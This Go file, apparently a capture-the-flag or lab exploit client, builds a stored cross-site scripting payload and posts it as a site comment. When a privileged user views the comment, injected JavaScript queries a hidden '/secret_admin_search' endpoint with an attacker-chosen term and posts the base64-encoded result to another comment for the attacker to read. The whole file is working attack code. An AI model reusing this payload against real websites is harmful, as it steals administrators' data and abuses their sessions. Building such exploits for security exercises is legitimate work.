package xss

import (
	"fmt"
)

//DoSearch this
func (s *Client) DoSearch(injection string) *RequestResult {
	fullURL := fmt.Sprintf("%s/comment/1", s.URLBase)
	s.ClearComment(1)

	payload = getSearchPayload(injection)

	r := s.postRequest(fullURL, EncodePayload([]byte(payload)))
	resp, _ := client.Do(r)

	bodyf := FetchBody(resp)
	defer resp.Body.Close()
	s.ClearComment(3)

	return &RequestResult{bodyf["message"], bodyf["result"]}
}

func getSearchPayload(payload string) string {
	javascript := `function PostSearch() {
    var datapost = new XMLHttpRequest();
	var params = "search=`
	js := `";
    datapost.open("POST", "/secret_admin_search", false);
    datapost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	datapost.send(params);
	var response = datapost.responseText;
    return response;
}
function ResSearch(response) {
    var datapost = new XMLHttpRequest();
    var params = "comment=" + btoa(response);             
    datapost.open("POST", "/comment/3", true);
    datapost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    datapost.send(params);
}
var res =PostSearch();
ResSearch(res);
`
	return fmt.Sprintf("%s%s%s", javascript, payload, js)
}
